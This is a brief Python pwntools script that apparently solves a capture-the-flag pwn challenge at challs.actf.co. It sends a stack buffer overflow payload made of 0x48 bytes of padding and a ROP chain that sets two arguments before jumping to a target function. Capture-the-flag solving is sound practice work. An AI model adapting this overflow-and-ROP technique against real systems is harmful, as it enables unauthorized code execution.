from pwn import *

io = remote('challs.actf.co', 31301)

io.sendline(b'a'*0x48+p64(0x00000000004013b3)+p64(0x1337)+p64(0x4013b1)+p64(0x4141)+p64(0)+p64(0x401236))
print(io.recvall())
